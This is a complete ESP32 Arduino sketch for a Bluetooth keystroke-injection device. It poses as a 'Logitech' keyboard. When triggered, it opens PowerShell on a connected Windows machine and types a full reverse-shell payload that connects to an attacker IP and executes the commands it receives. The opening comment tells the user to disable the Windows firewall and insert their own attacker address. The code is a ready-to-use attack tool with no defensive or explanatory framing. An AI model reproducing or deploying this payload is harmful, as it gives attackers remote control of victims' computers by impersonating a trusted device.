#include <BleKeyboard.h> /* disable firewall in windows and change the ip address in the payload to that of your attacker device */
#define pin1 2
bool laststate=HIGH;
const char *name="Logitech";
BleKeyboard keyboard(name,"Espressif",100);
bool state1;
void setup() {
   Serial.begin(115200);
   pinMode(pin1,INPUT_PULLUP);
   keyboard.begin();

}

void loop() {
  if(keyboard.isConnected()){
    state1=digitalRead(pin1);
    if(laststate==HIGH && state1==LOW){
      Serial.println("Trigger is running");
      keyboard.press(KEY_LEFT_GUI);
      keyboard.press('r');
      delay(500);
      keyboard.releaseAll();
      delay(1000);
      keyboard.print("powershell.exe");
      delay(100);
      keyboard.press(KEY_RETURN);
      delay(100);
      keyboard.releaseAll();
      delay(1000);
      const char* payload="powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";
      for(int i=0; i<strlen(payload); i++){
        keyboard.print(payload[i]);
        delay(50);
      }
      delay(100);
      keyboard.press(KEY_RETURN);
      delay(100);
      keyboard.releaseAll();
    }
  }
  

}
